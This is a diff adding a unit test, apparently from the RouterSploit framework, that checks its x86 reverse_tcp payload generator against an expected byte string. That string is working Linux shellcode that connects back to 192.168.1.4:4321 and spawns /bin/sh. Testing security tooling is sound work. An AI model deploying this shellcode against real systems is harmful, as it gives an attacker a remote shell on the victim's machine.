@@ -1,0 +1,21 @@
+from routersploit.modules.payloads.x86.reverse_tcp import Exploit
+
+
+# reverse tcp with lhost=192.168.1.4  lport=4321
+reverse_tcp = (
+    b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
+    b"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\x01\x04\x68"
+    b"\x02\x00\x10\xe1\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
+    b"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
+    b"\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
+)
+
+
+def test_payload_generation():
+    """ Test scenario - payload generation """
+
+    payload = Exploit()
+    payload.lhost = "192.168.1.4"
+    payload.lport = 4321
+
+    assert payload.generate() == reverse_tcp
